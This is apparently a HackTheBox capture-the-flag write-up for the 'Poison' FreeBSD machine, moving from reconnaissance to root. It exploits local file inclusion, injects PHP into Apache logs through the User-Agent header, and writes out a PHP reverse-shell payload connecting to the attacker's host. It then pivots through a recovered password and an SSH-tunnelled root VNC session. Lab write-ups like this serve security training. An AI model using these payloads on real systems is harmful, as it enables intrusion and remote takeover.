# Poison | HackTheBox

### 1. Scan
```bash
┌─[htb-jib1337@htb-xyupwgemyw]─[~]
└──╼ $sudo nmap -A -p- -T4 10.129.26.234
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 08:13 UTC
Nmap scan report for 10.129.26.234
Host is up (0.18s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=5/29%OT=22%CT=1%CU=35101%PV=Y%DS=2%DC=T%G=Y%TM=60B1FA2
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10C%TI=Z%CI=Z%TS=22)SEQ(SP=1
OS:04%GCD=1%ISR=109%TI=Z%CI=Z%II=RI%TS=22)OPS(O1=M54DNW6ST11%O2=M54DNW6ST11
OS:%O3=M280NW6NNT11%O4=M54DNW6ST11%O5=M218NW6ST11%O6=M109ST11)WIN(W1=FFFF%W
OS:2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=40%W=FFFF%O=M54DNW
OS:6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T
OS:=40%W=FFFF%S=O%A=S+%F=AS%O=M109NW6ST11%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%
OS:A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=
OS:G)IE(R=Y%DFI=S%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   179.82 ms 10.10.14.1
2   179.90 ms 10.129.26.234

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 650.68 seconds
```
The machine is running SSH (FreeBSD version) and a web server on port 80.

### 2. Enumerate web server
The web server is hosting a "temporary website to test local php scripts". It consists of an input box in which a user can enter a script name. Somce provided script names do the following:  
1. ini.pnp - lists a lot of configuration info, none of it looks particularly interesting.  
2. info.php - displays system infomation.  
3. listfiles.php - displays an array of current files in a directory.  
4. phpinfo.php - displays the phpinfo page.
  
Additionally, LFI is present which allows access to any file readable by the current user (www-data). The phpinfo page provides some valuable information on where certain files are. From the info it can be seen that the document root and include path is: /usr/local/www/apache24/data.
  
When using listfiles.php, it can be seen there is a file called pwdbackup.txt in the current directory, that can be read by browsing to: http://10.129.26.234/browse.php?file=pwdbackup.txt.
```
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= 
```
Decode this:
```bash
┌─[htb-jib1337@htb-xyupwgemyw]─[~/writeups/HackTheBox/HTB_Poison]
└──╼ $echo -n "Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=" | sed 's/\s//g' | base64 -d -w 0 | base64 -d -w 0 | base64 -d -w 0 | base64 -d -w 0 | base64 -d -w 0 | base64 -d -w 0 | base64 -d -w 0 | base64 -d -w 0 | base64 -d -w 0 | base64 -d -w 0 | base64 -d -w 0 | base64 -d -w 0 | base64 -d -w 0 
Charix!2#4%6&8(0
```
This gives what looks to be a password.
Using the LFI more, locate the HTTP access logs. Since this machine is BSD some google is needed to find where the log is. Using the LFI it is located at: http://10.129.26.234/browse.php?file=../../../../../../../../var/log/httpd-access.log.
With access to this file, PHP code can be embedded by sending a request which will result in code execution.

### 3. Get a shell
PHP code can be embedded in the user agent. Starting with code to return the result of a "whoami" command.
```
GET / HTTP/1.1
Host: 10.129.152.180
User-Agent: <?php echo shell_exec('whoami'); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.129.152.180/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```
This returns "www". With that confirmed, spawn a reverse shell with: `User-Agent: <?php $sock=fsockopen('10.10.14.3',9999);$proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>`.  
Get a shell in the listener.
```bash
┌─[htb-jib1337@htb-xyupwgemyw]─[~/Desktop]
└──╼ $nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.129.29.223 16715
sh: can't access tty; job control turned off
$ whoami
www
```

### 4. Enumerate from user
Check /etc/passwd.
```bash
$ cat /etc/passwd
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:*:1001:1001:charix:/home/charix:/bin/csh
```
The charix user is available, and hopefully the password that was retrived earlier will let us access them.

### 5. Switch users
```
$ su - charix
Password:Charix!2#4%6&8(0

Warning: no access to tty (Bad file descriptor).
Thus no job control in this shell.
To read a compressed file without having to first uncompress it, use
"zcat" or "zless" to view it.
		-- Dru <genesis@istar.ca>

whoami
charix
```

### 6. Enumerate from user
Before going any further, can kill this session and just login over SSH.
```bash
┌─[htb-jib1337@htb-xyupwgemyw]─[~/Desktop]
└──╼ $ssh charix@10.129.29.223
Password for charix@Poison:
Last login: Sat May 29 12:44:06 2021 from 10.10.14.3
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
You can use the 'fetch' command to retrieve files over ftp, http or https.

	 fetch http://www.FreeBSD.org/index.html

will download the front page of the FreeBSD web site.
charix@Poison:~ % ls
secret.zip	user.txt
```
secret.zip looks interesting. Attempt to extract it, and despite being told the file needs a password, can't work out how to enter one so just scp it to the local machine to extract it there using the last password retrieved.
```bash
┌─[htb-jib1337@htb-xyupwgemyw]─[~/Desktop]
└──╼ $scp charix@10.129.29.223:secret.zip .
Password for charix@Poison:
secret.zip                                                                                                                                         100%  166     0.9KB/s   00:00
┌─[htb-jib1337@htb-xyupwgemyw]─[~/Desktop]
└──╼ $unzip secret.zip 
Archive:  secret.zip
[secret.zip] secret password: 
 extracting: secret                  
┌─[htb-jib1337@htb-xyupwgemyw]─[~/Desktop]
└──╼ $cat secret
��[|Ֆz!
```
The secret is retrieved. Now back to enumeration.  
When checking running processes, see that tightvnc is active, and running as root.
```bash
charix@Poison:~ % ps -aux
USER   PID  %CPU %MEM   VSZ   RSS TT  STAT STARTED    TIME COMMAND
root    11 100.0  0.0     0    16  -  RL   12:02   2:52.19 [idle]
root     0   0.0  0.0     0   160  -  DLs  12:02   0:00.00 [kernel]
root     1   0.0  0.1  5408   976  -  ILs  12:02   0:00.00 /sbin/init --
root     2   0.0  0.0     0    16  -  DL   12:02   0:00.00 [crypto]
root     3   0.0  0.0     0    16  -  DL   12:02   0:00.00 [crypto returns]
root     4   0.0  0.0     0    32  -  DL   12:02   0:00.01 [cam]
root     5   0.0  0.0     0    16  -  DL   12:02   0:00.00 [mpt_recovery0]
root     6   0.0  0.0     0    16  -  DL   12:02   0:00.00 [sctp_iterator]
root     7   0.0  0.0     0    16  -  DL   12:02   0:01.21 [rand_harvestq]
root     8   0.0  0.0     0    16  -  DL   12:02   0:00.00 [soaiod1]
root     9   0.0  0.0     0    16  -  DL   12:02   0:00.00 [soaiod2]
root    10   0.0  0.0     0    16  -  DL   12:02   0:00.00 [audit]
root    12   0.0  0.1     0   736  -  WL   12:02   0:00.16 [intr]
root    13   0.0  0.0     0    48  -  DL   12:02   0:00.00 [geom]
root    14   0.0  0.0     0   160  -  DL   12:02   0:00.01 [usb]
root    15   0.0  0.0     0    16  -  DL   12:02   0:00.00 [soaiod3]
root    16   0.0  0.0     0    16  -  DL   12:02   0:00.00 [soaiod4]
root    17   0.0  0.0     0    48  -  DL   12:02   0:00.00 [pagedaemon]
root    18   0.0  0.0     0    16  -  DL   12:02   0:00.00 [vmdaemon]
root    19   0.0  0.0     0    16  -  DL   12:02   0:00.00 [pagezero]
root    20   0.0  0.0     0    32  -  DL   12:02   0:00.00 [bufdaemon]
root    21   0.0  0.0     0    16  -  DL   12:02   0:00.00 [bufspacedaemon]
root    22   0.0  0.0     0    16  -  DL   12:02   0:00.01 [syncer]
root    23   0.0  0.0     0    16  -  DL   12:02   0:00.00 [vnlru]
root   332   0.0  0.2 10624  2380  -  Is   12:02   0:00.01 dhclient: le0 [priv] (dhclient)
_dhcp  395   0.0  0.2 10624  2496  -  Is   12:02   0:00.00 dhclient: le0 (dhclient)
root   396   0.0  0.5  9560  5052  -  Ss   12:02   0:00.01 /sbin/devd
root   469   0.0  0.2 10500  2396  -  Ss   12:02   0:00.01 /usr/sbin/syslogd -s
root   622   0.0  0.5 56320  5388  -  S    12:02   0:00.13 /usr/local/bin/vmtoolsd -c /usr/local/share/vmware-tools/tools.conf -p /usr/local/lib/open-vm-tools/plugins/vmsvc
root   697   0.0  0.7 57812  7052  -  Is   12:02   0:00.00 /usr/sbin/sshd
root   704   0.0  1.1 99172 11516  -  Ss   12:02   0:00.01 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    716   0.0  1.1 99172 11528  -  I    12:02   0:00.00 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    717   0.0  1.1 99172 11528  -  S    12:02   0:00.00 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    718   0.0  1.1 99172 11528  -  I    12:02   0:00.00 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    719   0.0  1.1 99172 11528  -  I    12:02   0:00.00 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    720   0.0  1.1 99172 11528  -  I    12:02   0:00.00 /usr/local/sbin/httpd -DNOHTTPACCEPT
root   721   0.0  0.6 20636  6140  -  Ss   12:03   0:00.01 sendmail: accepting connections (sendmail)
smmsp  724   0.0  0.6 20636  5968  -  Is   12:03   0:00.00 sendmail: Queue runner@00:30:00 for /var/spool/clientmqueue (sendmail)
root   728   0.0  0.2 12592  2436  -  Is   12:03   0:00.00 /usr/sbin/cron -s
root   784   0.0  0.8 85228  7768  -  Is   12:04   0:00.01 sshd: charix [priv] (sshd)
charix 787   0.0  0.8 85228  7832  -  S    12:04   0:00.01 sshd: charix@pts/1 (sshd)
root   608   0.0  0.9 23620  8868 v0- I    12:02   0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 
root   619   0.0  0.7 67220  7060 v0- I    12:02   0:00.02 xterm -geometry 80x24+10+10 -ls -title X Desktop
root   620   0.0  0.5 37620  5312 v0- I    12:02   0:00.01 twm
root   775   0.0  0.2 10484  2076 v0  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv0
root   776   0.0  0.2 10484  2076 v1  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv1
root   777   0.0  0.2 10484  2076 v2  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv2
root   778   0.0  0.2 10484  2076 v3  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv3
root   779   0.0  0.2 10484  2076 v4  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv4
root   780   0.0  0.2 10484  2076 v5  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv5
root   781   0.0  0.2 10484  2076 v6  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv6
root   782   0.0  0.2 10484  2076 v7  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv7
root   699   0.0  0.4 19660  3616  0  Is+  12:02   0:00.01 -csh (csh)
charix 788   0.0  0.4 19660  3576  1  Ss   12:04   0:00.01 -csh (csh)
charix 796   0.0  0.3 21208  2652  1  R+   12:05   0:00.00 ps -aux
```
Can see the http daemon is also running, but on what port?
```bash
charix@Poison:~ % netstat -a -4 -f inet -p tcp
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0     44 10.129.1.254.ssh       10.10.14.25.50710      ESTABLISHED
tcp4       0      0 localhost.smtp         *.*                    LISTEN
tcp4       0      0 *.http                 *.*                    LISTEN
tcp4       0      0 *.ssh                  *.*                    LISTEN
tcp4       0      0 localhost.5801         *.*                    LISTEN
tcp4       0      0 localhost.5901         *.*                    LISTEN
```
It could be either 5801 or 5901. We can check both, starting with 5801.  
Create port forwards so the ports can be accessed through the SSH tunnel:
```bash
charix@Poison:~ % 
ssh> -L 127.0.0.1:9999:127.0.0.1:5801
Forwarding port.
charix@Poison:~ % 
ssh> -L 127.0.0.1:9998:127.0.0.1:5901
Forwarding port.
```
Then attempt to connect to each port using VNCViewer. The first port doesn't work. The second one successfully connects and asks for a password.
```bash
┌──(kali㉿kali)-[10.10.14.25]-[~/Desktop]
└─$ vncviewer localhost:9999
^C
                                                                                                                                                                                      
┌──(kali㉿kali)-[10.10.14.25]-[~/Desktop]
└─$ vncviewer localhost:9998                                                                                                                                                    130 ⨯
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password: 

```

### 7. Use the secret and get to root
Try to use the secret by pasting it as the password, but it doesn't work.
```bash
┌──(kali㉿kali)-[10.10.14.25]-[~/Desktop]
└─$ vncviewer localhost:9998                                                                                                                                                      1 ⨯
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password: 
Authentication failed
```
I also try other passwords found and none of those work either. However looking at vncviewer's help, there is a argument to pass in a password file.
```bash
┌──(kali㉿kali)-[10.10.14.25]-[~/Desktop]
└─$ vncviewer --help                                                                                                                                                              1 ⨯
TightVNC Viewer version 1.3.10

Usage: vncviewer [<OPTIONS>] [<HOST>][:<DISPLAY#>]
       vncviewer [<OPTIONS>] [<HOST>][::<PORT#>]
       vncviewer [<OPTIONS>] -listen [<DISPLAY#>]
       vncviewer -help

<OPTIONS> are standard Xt options, or:
        -via <GATEWAY>
        -shared (set by default)
        -noshared
        -viewonly
        -fullscreen
        -noraiseonbeep
        -passwd <PASSWD-FILENAME> (standard VNC authentication)
```
Use this with the "secret" file to get logged in as the root user in a graphical interface. Just to get back in my terminal I can spawn a reverse shell back.
```bash
┌──(kali㉿kali)-[10.10.14.25]-[~/Desktop]
└─$ nc -lvnp 9997
listening on [any] 9997 ...
connect to [10.10.14.25] from (UNKNOWN) [10.129.1.254] 60983
# python -c "import pty;pty.spawn('/bin/csh')"
You have mail.
root@Poison:/tmp # id
id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
```